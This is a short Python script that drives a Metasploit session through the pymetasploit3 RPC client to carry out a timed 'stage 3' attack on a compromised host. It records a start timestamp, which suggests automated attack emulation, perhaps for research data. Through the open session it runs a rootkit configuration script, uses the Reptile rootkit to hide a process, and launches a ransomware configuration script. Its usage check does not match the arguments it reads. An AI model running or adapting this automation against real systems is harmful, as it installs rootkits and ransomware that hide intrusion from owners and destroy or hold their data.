import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    shell = client.sessions.session('1')
    shell.write('./EVIL_RABBIT/evil_config.sh')
    shell.write('./Reptile/rootkit_config.sh')
    shell.write('netstat')
    shell.write('tmppid=$(ps -ef | grep \'netstat\' | awk \'{print $2}\')')
    shell.write('/reptile/reptile_cmd hide tmppid')
    # ransomware
    shell.write('./randomware/randomware_config.sh')


main(sys.argv)
